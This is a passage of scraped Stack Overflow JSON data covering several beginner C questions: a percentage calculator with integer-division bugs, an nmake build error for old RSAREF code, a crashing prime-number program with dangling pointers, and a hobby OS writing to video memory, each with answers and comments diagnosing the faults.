"https://i.stack.imgur.com/5qiYa.jpg?s=128&g=1", "display_name": "Bathsheba", "link": "https://stackoverflow.com/users/2380830/bathsheba"}, "edited": false, "score": 0, "creation_date": 1499173400, "post_id": 44906784, "comment_id": 76790494, "body": "<code>100.0 * sum1 &#47; n</code> might work better. You currently round downwards."}], "tags": [], "owner": {"reputation": 1435, "user_id": 8113019, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2e1b7cb4133be670ac94023c9fcc6816?s=128&d=identicon&r=PG&f=1", "display_name": "Marek Vitek", "link": "https://stackoverflow.com/users/8113019/marek-vitek"}, "is_accepted": false, "score": 0, "last_activity_date": 1499175041, "last_edit_date": 1499175041, "creation_date": 1499173268, "answer_id": 44906784, "question_id": 44906484, "link": "https://stackoverflow.com/questions/44906484/c-program-to-find-average/44906784#44906784", "title": "c program to find average", "body": "<p>How do you calculate percentage of some value? Your answers shouldn't be 1,1,1 but 33%, 33%, 33% for input you have. So your code should instead of this</p>\n\n<pre><code>per1=sum1/n;\n</code></pre>\n\n<p>be like this</p>\n\n<pre><code>per1=sum1*100.0/n;\n</code></pre>\n\n<p>And you have also got wrong your if conditions. The else part is tied only to second if. So every number less or equal to 0 is counted into sum3 which is not what you probably meant. So your</p>\n\n<pre><code> if (arr[i] &gt; 0)\n</code></pre>\n\n<p>should have been</p>\n\n<pre><code> else if (arr[i] &gt; 0)\n</code></pre>\n\n<p>And one last thing. On this line you are creating completely new variable sum1 that will live only to the end of the if statement and thus will not appear in the final calculation. I will leave it to you how to fix it.</p>\n\n<pre><code>int sum1 = sum1 + 1;\n</code></pre>\n\n<p>I don't know what environment you are using for development, but you should learn how to use debugger from the beginning. You can then peek into flow of your code to see what is going on and when it went wrong. With simple programs like this it is really easy. If you are on Visual Studio, they have really nice debugger integrated. Just set breakpoint and run Debug. If you are on Linux, there is gdb which might come pretty rough for beginners, but there are also graphical tools like ddd.</p>\n"}, {"tags": [], "owner": {"reputation": 105028, "user_id": 134554, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/1894f68e0b15fd3d5b27bfcb021fa11c?s=128&d=identicon&r=PG", "display_name": "John Bode", "link": "https://stackoverflow.com/users/134554/john-bode"}, "is_accepted": false, "score": 0, "last_activity_date": 1499180508, "creation_date": 1499180508, "answer_id": 44909238, "question_id": 44906484, "link": "https://stackoverflow.com/questions/44906484/c-program-to-find-average/44909238#44909238", "title": "c program to find average", "body": "<p>Since both <code>sum1</code> and <code>n</code> are integers, the result of <code>sum1/n</code> is also an integer.  This means that if <code>sum1</code> is less than <code>n</code>, then the result of <code>sum1 / n</code> is 0.  </p>\n\n<p>To get a floating point result, at least one of the operands has be be <code>float</code> or <code>double</code>.  I suggest you declare your <code>sum</code> variables to be <code>double</code> instead of <code>int</code>.</p>\n"}, {"tags": [], "owner": {"reputation": 1800, "user_id": 4769313, "user_type": "registered", "accept_rate": 44, "profile_image": "https://i.stack.imgur.com/gFISt.png?s=128&g=1", "display_name": "Sir Jo Black", "link": "https://stackoverflow.com/users/4769313/sir-jo-black"}, "is_accepted": true, "score": 0, "last_activity_date": 1499181935, "last_edit_date": 1499181935, "creation_date": 1499180761, "answer_id": 44909316, "question_id": 44906484, "link": "https://stackoverflow.com/questions/44906484/c-program-to-find-average/44909316#44909316", "title": "c program to find average", "body": "<p>I think this code is a little bit better. I've used the function <code>malloc()</code> instead of the \"scattered\" declaration <code>int arr[n]</code> (in this case I prefer the old C style).</p>\n\n<p>People already said you the problem relevant to the variable types and some ways to solve the problem. Here there's another way similar to the others you just saw between the answers.</p>\n\n<pre><code>#include &lt;math.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;malloc.h&gt;\n\n#define STR_ORD_SUFFIX(i) (i&gt;3)?\"th\":(i==0)?\"--\":(i==1)?\"st\":(i==2)?\"nd\":\"rd\"\n\nint main()\n{\n    int n, *arr=NULL;\n    float per1,per2,per3;\n\n    int sum1=0;\n    int sum2=0;\n    int sum3=0;\n\n    printf(\"How many number you have to insert? \");\n    scanf(\"%d\",&amp;n);\n    if (n&lt;=0)\n        return 1;\n\n    arr=malloc(n*sizeof(*arr));\n    if (arr==NULL)\n        return 2;\n\n    printf(\"Insert %d number%c\\n\",n,(n!=1)?'s':'\\x0');\n    for(int i = 0; i &lt; n; i++){\n        printf(\"%4d%s: \",i+1,STR_ORD_SUFFIX(i+1));\n        scanf(\"%d\",&amp;arr[i]);\n    }\n\n    for(int i=0;i&lt;=n-1;i++)\n    {\n        if(arr[i]&lt;0){\n            sum1=sum1+1;\n        } else if(arr[i]&gt;0){\n            sum2=sum2+1;\n        } else {\n            sum3=sum3+1;\n        }\n    }\n\n    per1=sum1; per1/=n; per1*=100.0;\n    per2=sum2; per2/=n; per2*=100.0;\n    per3=sum3; per3/=n; per3*=100.0;\n\n    printf(\"\\n&lt;0 %.6f%%\\n&gt;0 %.6f%%\\n=0 %.6f%%\\n\",per1,per2,per3);\n\n    if (arr!=NULL)\n        free(arr);\n\n    return 0;\n\n}\n</code></pre>\n"}], "owner": {"reputation": 97, "user_id": 7698651, "user_type": "registered", "accept_rate": 8, "profile_image": "https://www.gravatar.com/avatar/4079f7286b1dd89813e917007550a7ac?s=128&d=identicon&r=PG&f=1", "display_name": "anku", "link": "https://stackoverflow.com/users/7698651/anku"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 121, "favorite_count": 0, "accepted_answer_id": 44909316, "answer_count": 4, "score": -6, "last_activity_date": 1499181935, "creation_date": 1499172571, "last_edit_date": 1499174397, "question_id": 44906484, "link": "https://stackoverflow.com/questions/44906484/c-program-to-find-average", "title": "c program to find average", "body": "<p>i am a beginner in coding ,i am trying to make a program where i input 'n' number of elements in array and find out what percentage of number are positive,negative and zeros.the output is not what i am expecting it is all 'zeros'.Where i input n=3,so the percentage should be .3,.3,.3 when i input numbers one positive,one negative and one zero.</p>\n\n<pre><code>#include &lt;math.h&gt;\n#include &lt;stdio.h&gt;\n\nint main()\n{\n    int n;\n    float per1, per2, per3;\n    scanf(\"%d\", &amp;n);\n    int arr[n];\n    for (int i = 0; i &lt; n; i++)\n    {\n        scanf(\"%d\", &amp;arr[i]);\n    }\n\n    int sum1 = 0;\n    int sum2 = 0;\n    int sum3 = 0;\n\n    for (int i = 0; i &lt;= n - 1; i++)\n    {\n        if (arr[i] &lt; 0)\n        {\n            int sum1 = sum1 + 1;\n        }\n        if (arr[i] &gt; 0)\n        {\n            sum2 = sum2 + 1;\n        }\n        else\n        {\n            sum3 = sum3 + 1;\n        }\n    }\n\n    per1 = sum1 / n;\n    per2 = sum2 / n;\n    per3 = sum3 / n;\n    printf(\"%.6f\\n%.6f\\n%.6f\\n\", per1, per2, per3);\n\n    return 0;\n}\n</code></pre>\n\n<p>output</p>\n\n<pre><code>3\n1\n-2\n0\n0.000000\n0.000000\n0.000000\n</code></pre>\n\n<p>the last three numbers should be .3,.3,.3 but it is giving zeros.</p>\n"}, {"tags": ["c", "makefile", "nmake"], "comments": [{"owner": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "edited": false, "score": 1, "creation_date": 1499172562, "post_id": 44906448, "comment_id": 76789856, "body": "Show the makefile."}, {"owner": {"reputation": 17054, "user_id": 5636775, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/GC9DT.gif?s=128&g=1", "display_name": "Ctx", "link": "https://stackoverflow.com/users/5636775/ctx"}, "edited": false, "score": 0, "creation_date": 1499172679, "post_id": 44906448, "comment_id": 76789953, "body": "From the sourceforge-site: &quot;Description: This is the ancient and highly depreciated RSA refrence code.&quot; &lt;- Ancient code often depends on ancient build environments and is therefore hard to compile"}, {"owner": {"reputation": 17054, "user_id": 5636775, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/GC9DT.gif?s=128&g=1", "display_name": "Ctx", "link": "https://stackoverflow.com/users/5636775/ctx"}, "edited": false, "score": 0, "creation_date": 1499172927, "post_id": 44906448, "comment_id": 76790156, "body": "You can try this: enter the directory &quot;install&quot; and type <code>nmake &#47;F dos\\makefile</code>"}, {"owner": {"reputation": 17, "user_id": 8120951, "user_type": "registered", "profile_image": "https://graph.facebook.com/10207249106666001/picture?type=large", "display_name": "Harry Budd", "link": "https://stackoverflow.com/users/8120951/harry-budd"}, "reply_to_user": {"reputation": 17054, "user_id": 5636775, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/GC9DT.gif?s=128&g=1", "display_name": "Ctx", "link": "https://stackoverflow.com/users/5636775/ctx"}, "edited": false, "score": 0, "creation_date": 1499173192, "post_id": 44906448, "comment_id": 76790360, "body": "@Ctx This gives me a new error:  &quot;LINK : fatal error LNK1181: cannot open input file &#39;rsaref.lib;&#39;  NMAKE : fatal error U1077: &#39;if&#39; : return code &#39;0x49d&#39; &quot;"}, {"owner": {"reputation": 45838, "user_id": 1362568, "user_type": "registered", "accept_rate": 55, "profile_image": "https://i.stack.imgur.com/EAFi0.jpg?s=128&g=1", "display_name": "Mike Kinghan", "link": "https://stackoverflow.com/users/1362568/mike-kinghan"}, "edited": false, "score": 0, "creation_date": 1499249038, "post_id": 44906448, "comment_id": 76821680, "body": "&quot;I&#39;m calling nmake whilst in the \\install\\dos\\ directory&quot; It seems that you haven&#39;t read <code>doc\\readme.txt</code>"}], "owner": {"reputation": 17, "user_id": 8120951, "user_type": "registered", "profile_image": "https://graph.facebook.com/10207249106666001/picture?type=large", "display_name": "Harry Budd", "link": "https://stackoverflow.com/users/8120951/harry-budd"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 1570, "favorite_count": 0, "answer_count": 0, "score": 1, "last_activity_date": 1499172574, "creation_date": 1499172489, "last_edit_date": 1499172574, "question_id": 44906448, "link": "https://stackoverflow.com/questions/44906448/nmake-file-not-found-error-u1052", "title": "nmake: file not found (error U1052)", "body": "<p>I am trying to use nmake to build a program I downloaded <a href=\"https://sourceforge.net/projects/rsaref/\" rel=\"nofollow noreferrer\">(source)</a>. The program is old (1994) but I need to build it for research purposes.</p>\n\n<p>As I'm using windows, I'm calling nmake whilst in the \\install\\dos\\ directory, and receiving: </p>\n\n<blockquote>\n  <p>makefile(62) : fatal error U1052: file '..\\source\\targets.mak' not\n  found.</p>\n</blockquote>\n\n<p>I've checked, and targets.mak does exist in 'X:\\Desktop\\rsaref\\source\\targets.mak' so I tried the command:</p>\n\n<blockquote>\n  <p>nmake /F X:\\Desktop\\rsaref\\source\\targets.mak</p>\n</blockquote>\n\n<p>But I now receive the error: </p>\n\n<blockquote>\n  <p>NMAKE : fatal error U1073: don't know how to make 'desc.c'</p>\n</blockquote>\n\n<p>I have no clue what i'm doing here as i've never used makefiles before, and as this program is highly depreciated, i'm struggling to find advice on how to use it.</p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 35578, "user_id": 3000206, "user_type": "registered", "accept_rate": 98, "profile_image": "https://i.stack.imgur.com/BK1fo.jpg?s=128&g=1", "display_name": "Carcigenicate", "link": "https://stackoverflow.com/users/3000206/carcigenicate"}, "edited": false, "score": 0, "creation_date": 1499172072, "post_id": 44906261, "comment_id": 76789522, "body": "Does it crash, or does it hang? The title seems to contradict the body."}, {"owner": {"reputation": 35578, "user_id": 3000206, "user_type": "registered", "accept_rate": 98, "profile_image": "https://i.stack.imgur.com/BK1fo.jpg?s=128&g=1", "display_name": "Carcigenicate", "link": "https://stackoverflow.com/users/3000206/carcigenicate"}, "edited": false, "score": 0, "creation_date": 1499172144, "post_id": 44906261, "comment_id": 76789573, "body": "And what debugging have you done? Where does it get stuck <b>exactly</b> / what is the error it crashes with?"}, {"owner": {"reputation": 3332, "user_id": 2266261, "user_type": "registered", "accept_rate": 76, "profile_image": "https://i.stack.imgur.com/syTtz.jpg?s=128&g=1", "display_name": "Dunno", "link": "https://stackoverflow.com/users/2266261/dunno"}, "edited": false, "score": 0, "creation_date": 1499172151, "post_id": 44906261, "comment_id": 76789577, "body": "random crashes usually come from accessing unitialized/freed memory"}, {"owner": {"reputation": 21147, "user_id": 7733418, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b08876b87c096cd006f66820ffc67f27?s=128&d=identicon&r=PG", "display_name": "Yunnosch", "link": "https://stackoverflow.com/users/7733418/yunnosch"}, "edited": false, "score": 0, "creation_date": 1499172245, "post_id": 44906261, "comment_id": 76789648, "body": "Please provide a <a href=\"https://stackoverflow.com/help/minimal-reproducible-example\">minimal reproducible example</a>, instead of a code puzzle."}, {"owner": {"reputation": 681, "user_id": 5994074, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/dzK2Q.jpg?s=128&g=1", "display_name": "GAURANG VYAS", "link": "https://stackoverflow.com/users/5994074/gaurang-vyas"}, "edited": false, "score": 3, "creation_date": 1499172290, "post_id": 44906261, "comment_id": 76789674, "body": "<code>newPrimes</code> is global variable and <code>temp</code> is local to the fucntion <code>calculateNewPrimes</code> and in the function  you do <code>long long int temp[newAmount]; newPrimes = temp;</code>. This clearly causes undefined behaviour when you access <code>newPrimes</code> later in the program. To overcome this you can use <code>malloc</code> or <code>calloc</code>. There can be several other errors like this and the one mentioned in one of the comments. You can look for them."}, {"owner": {"reputation": 3854, "user_id": 2235885, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/09d0d6a08639ef79ef960a52bd013e02?s=128&d=identicon&r=PG", "display_name": "joop", "link": "https://stackoverflow.com/users/2235885/joop"}, "edited": false, "score": 2, "creation_date": 1499172311, "post_id": 44906261, "comment_id": 76789684, "body": "<code>long long int temp[1] = {2};</code> this is in automatic storage. You point a <i>global</i> pointer to this."}, {"owner": {"reputation": 105028, "user_id": 134554, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/1894f68e0b15fd3d5b27bfcb021fa11c?s=128&d=identicon&r=PG", "display_name": "John Bode", "link": "https://stackoverflow.com/users/134554/john-bode"}, "edited": false, "score": 1, "creation_date": 1499172553, "post_id": 44906261, "comment_id": 76789852, "body": "Your <code>temp</code> arrays <i>cease to exist</i> when their enclosing functions exit, rendering your <code>newPrimes</code> and <code>knownPrimes</code> pointers <i>invalid</i>.  You&#39;re hip deep in undefined behavior territory here."}, {"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 0, "creation_date": 1499172901, "post_id": 44906261, "comment_id": 76790128, "body": "Get rid of the global variables in the first place. They are likely the source of many bugs here."}, {"owner": {"reputation": 94553, "user_id": 775806, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/XNd2C.png?s=128&g=1", "display_name": "n. &#39;pronouns&#39; m.", "link": "https://stackoverflow.com/users/775806/n-pronouns-m"}, "edited": false, "score": 0, "creation_date": 1499174990, "post_id": 44906261, "comment_id": 76791516, "body": "<code>long long int temp[newAmount];</code> Don&#39;t use automatic VLAs, they will crash your program."}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1499179375, "post_id": 44906261, "comment_id": 76794199, "body": "<code>void prepareSession();</code> etc. are invalid declarators. Use a prototype: <code>void prepareSession(void);</code> etc."}, {"owner": {"reputation": 2988, "user_id": 452414, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/rDMfs.png?s=128&g=1", "display_name": "babon", "link": "https://stackoverflow.com/users/452414/babon"}, "edited": false, "score": 0, "creation_date": 1499181493, "post_id": 44906261, "comment_id": 76795527, "body": "&quot;to see how much faster it would run in comparison to Java&quot; - All this just to see how fast C is?"}], "answers": [{"comments": [{"owner": {"reputation": 1338, "user_id": 4360353, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/16f921d78049db0195bb3fc3cda8e0f0?s=128&d=identicon&r=PG&f=1", "display_name": "Basya", "link": "https://stackoverflow.com/users/4360353/basya"}, "reply_to_user": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1499246193, "post_id": 44907558, "comment_id": 76819467, "body": "Perhaps.  Considering the form of the question though, I thought this was a reasonable kind of answer.  You are free to disagree :-) and might be right though..."}, {"owner": {"reputation": 1338, "user_id": 4360353, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/16f921d78049db0195bb3fc3cda8e0f0?s=128&d=identicon&r=PG&f=1", "display_name": "Basya", "link": "https://stackoverflow.com/users/4360353/basya"}, "edited": false, "score": 0, "creation_date": 1499287231, "post_id": 44907558, "comment_id": 76847400, "body": "Thank you Gaurang Vyas for the edits.  I see I have a lot to learn about how to write and format an answer here!"}], "tags": [], "owner": {"reputation": 1338, "user_id": 4360353, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/16f921d78049db0195bb3fc3cda8e0f0?s=128&d=identicon&r=PG&f=1", "display_name": "Basya", "link": "https://stackoverflow.com/users/4360353/basya"}, "is_accepted": false, "score": 1, "last_activity_date": 1499200720, "last_edit_date": 1499200720, "creation_date": 1499175532, "answer_id": 44907558, "question_id": 44906261, "link": "https://stackoverflow.com/questions/44906261/c-program-crashes-sometimes-and-sometimes-not/44907558#44907558", "title": "C program crashes sometimes and sometimes not", "body": "<p>OK, a few pointers to get started here.</p>\n\n<p>You say, \"it seems to get stuck\", sometimes.  Let's break this down:</p>\n\n<ol>\n<li>Do you mean the program hangs?  How do you know it is in this\nfunction?  Have you broken into the debugger?</li>\n<li>Does the \"sometimes\" have any relationship to the input?  Or is it random?  \"Input\" would include both the file and the number you input.</li>\n<li>Does the program ever crash?</li>\n</ol>\n\n<p><strong>Suggestion #1:</strong> If the program hangs, you should be able to break into it in the debugger, and then step through the code to see where it is going wrong.  Otherwise, some print statements in key places can give you debugging hints.</p>\n\n<p>Now to the code itself.</p>\n\n<ol>\n<li>You have a clear bug in the code as mentioned in \u2013 <a href=\"https://stackoverflow.com/questions/44906261/c-program-crashes-sometimes-and-sometimes-not#comment76789674_44906261\">GAURANG VYAS's   comment</a>\n.  You are referencing a local variable through a global\npointer (<code>temp</code>) after the function has exited.   This alone could\ncause inconsistent behaviour, crashes, etc.</li>\n<li>You've got an <code>else if</code> with a somewhat complex condition.  If you aren't a whiz in C operator precedence, you may or may not be doing what you think you are.  (Even if you have it right, the next person reading the code may not!).  I suggest using parentheses.</li>\n<li>OK, I copied, compiled, and ran your code.  You are going into an infinite loop, and it does seem to be related to the number you input.  <code>5</code> always seems to work, <code>6</code> does not.  This is a useful clue; your conditions to exit the loop are failing when the number gets larger. Again, since you are referencing freed memory you may be using invalid data here.</li>\n</ol>\n\n<p>Try adding the line - <br/> \n<code>printf(\"current is %d\\n\", current);</code> immediately after <code>current+=2;</code><br/>\nand you will see that you are in an infinite loop; it just keeps increasing.</p>\n\n<p>This is hopefully enough information for you to continue the debugging.</p>\n"}], "owner": {"reputation": 35, "user_id": 5333343, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Gj64G.jpg?s=128&g=1", "display_name": "Lukas F.", "link": "https://stackoverflow.com/users/5333343/lukas-f"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 890, "favorite_count": 0, "closed_date": 1499207061, "answer_count": 1, "score": -4, "last_activity_date": 1499200720, "creation_date": 1499171978, "last_edit_date": 1499172183, "question_id": 44906261, "link": "https://stackoverflow.com/questions/44906261/c-program-crashes-sometimes-and-sometimes-not", "closed_reason": "Not suitable for this site", "title": "C program crashes sometimes and sometimes not", "body": "<p>I'm only a few days into C programming. I wanted to rewrite a small program for computing prime numbers in C to see how much faster it would run in comparison to Java (the programming language I'm coming from).</p>\n\n<p>I now encountered a (to me) very strange problem. Sometimes the program works fine, compiles and terminates, but sometimes it crashes somewhere in the \"calculateNewPrimes()\" function. Eclipse doesn't display any error-messages and the compilation seems also to work fine. Does anybody see the mistake and could point it out for a c-newbie like me? :) Previous research on this site and other web-pages didn't brought any result.</p>\n\n<p>Global variables:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;time.h&gt;\n\nvoid prepareSession();\nvoid calculateNewPrimes();\nvoid saveResults();\n\n// you can modify the filepath here if you're on a new machine\nchar filePath[] = \"/home/userName/Eclipse/workspace/PrimeNumbers/primes.txt\";\n\n// the available system memory or the maxAmount of memory you would like\n// to use for the storage of the prime-numbers in BYTES\nlong long int memorySize = 7000000000LL;\n\n//The file where the prime numbers will be saved\nFILE *file;\n\n// We begin with the number 3, so that we only have to check odd numbers.\n// 2 is therefore already discovered (amount = 1)\nlong long int oldAmount = 1;\nlong long int current = 3;\n\n// a pointer to the array with the already known primes\nlong long int *knownPrimes;\nlong long int *newPrimes;\n</code></pre>\n\n<p>The program consists of 3 functions. The first one reads primes from previous calculations in the memory, the second one calculates the new primes and the last function saves the newly calculated primes back into the file.</p>\n\n<pre><code>int main(){\n    prepareSession();\n    calculateNewPrimes();\n    saveResults();\n}\n</code></pre>\n\n<p>The function prepareSession() seems to work just fine. You can assume that the file doesn't exist yet and the start conditions are used.</p>\n\n<pre><code>void prepareSession(){\n    // try to open the file, if the file doesn't exist it will be created\n    file = fopen(filePath,\"a+\");\n    long long int temp = -1;\n    fscanf(file,\"%lli\",&amp;temp);\n    // if the file isn't empty, read the amount and the highest number in their variables\n    if(temp != -1){\n        /*some code */\n    }\n    else{\n        // the file was newly created so the only known prime is 2\n        printf(\"File doesn't yet exist. \\n\");\n        long long int temp[1] = {2};\n        knownPrimes = temp;\n    }\n    fclose (file);\n}\n</code></pre>\n\n<p>The critical function. Somewhere here the error occurs.</p>\n\n<pre><code>void calculateNewPrimes(){\n        long long int newAmount;\n        long long int primesFound = 0;\n\n        printf(\"How many new primes would you like to calculate? \\n\");\n        scanf(\"%lli\",&amp;newAmount);\n        printf(\"I will calculate %lli new primes. \\n\",newAmount);\n        long long int temp[newAmount];\n        newPrimes = temp;\n\n        //prepare measuring\n        double progress=0.0;\n        int oldProgress=0;\n        time_t start = time(0);\n\n        long long int currentNumber,oldNumber;\n        // start the calculations\n        while(primesFound &lt; newAmount){\n            oldNumber = 2;\n            for(long long int i = 1; i &lt; oldAmount + newAmount; i++){\n                if(i &lt; oldAmount){currentNumber = *(knownPrimes + i);}\n                else{ currentNumber = *(newPrimes + (i-oldAmount));}\n\n                if(current % currentNumber == 0){\n                    break;\n                }\n                else if(currentNumber &gt; current/oldNumber || i == oldAmount + primesFound-1){\n                    *(newPrimes + primesFound++) = current;\n                    printf(\"Found Nr.%lli: %lli \\n\",primesFound,current);\n                    progress = (primesFound)/(double) newAmount;\n                    while(oldProgress/100.0 &lt; progress){\n                            printf(\"%d \\n\",++oldProgress);\n                    }\n                    break;\n                }\n            }\n            current+=2;\n        }\n        double timeDifference = difftime( time(0), start);\n        printf(\"It took %g to calculate %lli new Primes \\n\",timeDifference, newAmount);\n    }\n</code></pre>\n"}, {"tags": ["c", "operating-system"], "comments": [{"owner": {"reputation": 17054, "user_id": 5636775, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/GC9DT.gif?s=128&g=1", "display_name": "Ctx", "link": "https://stackoverflow.com/users/5636775/ctx"}, "edited": false, "score": 4, "creation_date": 1499170901, "post_id": 44905772, "comment_id": 76788691, "body": "Just a typo: <code>unsigned short* VideoMemory = (unsigned short*) 0xb800;</code>"}, {"owner": {"reputation": 16907, "user_id": 4832499, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/76532994f6efa8d7dc8a3bb5b7b262a8?s=128&d=identicon&r=PG&f=1", "display_name": "Passer By", "link": "https://stackoverflow.com/users/4832499/passer-by"}, "edited": false, "score": 1, "creation_date": 1499171081, "post_id": 44905772, "comment_id": 76788815, "body": "<code>(unsigned short*) VideoMemory = (unsigned short*) 0xb800;</code> is parsed as <i>cast <code>VideoMemory</code> to <code>unsigned short*</code> and assign the right hand side to the result</i>, if you&#39;re wondering why the compiler can&#39;t figure that out."}, {"owner": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "edited": false, "score": 0, "creation_date": 1499171930, "post_id": 44905772, "comment_id": 76789416, "body": "Your <code>printf</code> function is rather a basic <a href=\"http://www.cplusplus.com/reference/cstdio/puts/\" rel=\"nofollow noreferrer\"><code>puts</code></a>."}], "answers": [{"comments": [{"owner": {"user_type": "does_not_exist", "display_name": "user2371524"}, "edited": false, "score": 2, "creation_date": 1499178013, "post_id": 44906309, "comment_id": 76793372, "body": "I&#39;d say even <code>kprintf()</code> would be a bad name for a function that cannot format anything. Something like <code>kstrout()</code> or maybe <code>kputstr()</code> would be more descriptive."}, {"owner": {"reputation": 97126, "user_id": 4593267, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/EEyLy.jpg?s=128&g=1", "display_name": "chqrlie", "link": "https://stackoverflow.com/users/4593267/chqrlie"}, "edited": false, "score": 0, "creation_date": 1499182794, "post_id": 44906309, "comment_id": 76796300, "body": "@FelixPalmen: I agree, as long as the function does not handle formatting, it should not bear the <code>printf</code> mark.  The OP needs substantial work to get this working, but it is a very good project to learn C programming."}, {"owner": {"reputation": 1669, "user_id": 7508077, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5b4193888717f50e77805498af1435b9?s=128&d=identicon&r=PG&f=1", "display_name": "EsmaeelE", "link": "https://stackoverflow.com/users/7508077/esmaeele"}, "edited": false, "score": 0, "creation_date": 1499185472, "post_id": 44906309, "comment_id": 76797706, "body": "This cause a Segmentation faults."}, {"owner": {"reputation": 97126, "user_id": 4593267, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/EEyLy.jpg?s=128&g=1", "display_name": "chqrlie", "link": "https://stackoverflow.com/users/4593267/chqrlie"}, "reply_to_user": {"reputation": 1669, "user_id": 7508077, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5b4193888717f50e77805498af1435b9?s=128&d=identicon&r=PG&f=1", "display_name": "EsmaeelE", "link": "https://stackoverflow.com/users/7508077/esmaeele"}, "edited": false, "score": 0, "creation_date": 1499185620, "post_id": 44906309, "comment_id": 76797768, "body": "@EsmaeelE: what is your target system? what tool chain do you use?  how do you test your work??"}, {"owner": {"reputation": 1669, "user_id": 7508077, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5b4193888717f50e77805498af1435b9?s=128&d=identicon&r=PG&f=1", "display_name": "EsmaeelE", "link": "https://stackoverflow.com/users/7508077/esmaeele"}, "edited": false, "score": 0, "creation_date": 1499185756, "post_id": 44906309, "comment_id": 76797830, "body": "GCC with  Ubuntu 16.04 LTS i686 CPU"}, {"owner": {"user_type": "does_not_exist", "display_name": "user2371524"}, "reply_to_user": {"reputation": 1669, "user_id": 7508077, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5b4193888717f50e77805498af1435b9?s=128&d=identicon&r=PG&f=1", "display_name": "EsmaeelE", "link": "https://stackoverflow.com/users/7508077/esmaeele"}, "edited": false, "score": 1, "creation_date": 1499191905, "post_id": 44906309, "comment_id": 76800333, "body": "@EsmaeelE you&#39;re aware this pointer is only meaningful in real mode (iow for something running on a PC <i>without</i> a kernel/os in place)?"}, {"owner": {"reputation": 1669, "user_id": 7508077, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5b4193888717f50e77805498af1435b9?s=128&d=identicon&r=PG&f=1", "display_name": "EsmaeelE", "link": "https://stackoverflow.com/users/7508077/esmaeele"}, "edited": false, "score": 0, "creation_date": 1499197454, "post_id": 44906309, "comment_id": 76802598, "body": "@FelixPalmen did you know how i can examine it on my system"}, {"owner": {"reputation": 17054, "user_id": 5636775, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/GC9DT.gif?s=128&g=1", "display_name": "Ctx", "link": "https://stackoverflow.com/users/5636775/ctx"}, "edited": false, "score": 0, "creation_date": 1499198098, "post_id": 44906309, "comment_id": 76802855, "body": "@FelixPalmen That&#39;s only half the truth... Provided that the system is in the correct video mode (standard 80x25, no fb etc) you can map the physical memory at 0xb8000 from /dev/mem and use it like in real mode"}, {"owner": {"reputation": 21, "user_id": 8070732, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/eee3b07232b93a91d1d938cd68ecbe0c?s=128&d=identicon&r=PG&f=1", "display_name": "ProgrammerProgrammerIOSAN", "link": "https://stackoverflow.com/users/8070732/programmerprogrammeriosan"}, "edited": false, "score": 0, "creation_date": 1499238526, "post_id": 44906309, "comment_id": 76814233, "body": "The source code of my operating system is on github: <a href=\"https://github.com/PixelDevelopers/PDOS\" rel=\"nofollow noreferrer\">github.com/PixelDevelopers/PDOS</a>"}, {"owner": {"reputation": 21, "user_id": 8070732, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/eee3b07232b93a91d1d938cd68ecbe0c?s=128&d=identicon&r=PG&f=1", "display_name": "ProgrammerProgrammerIOSAN", "link": 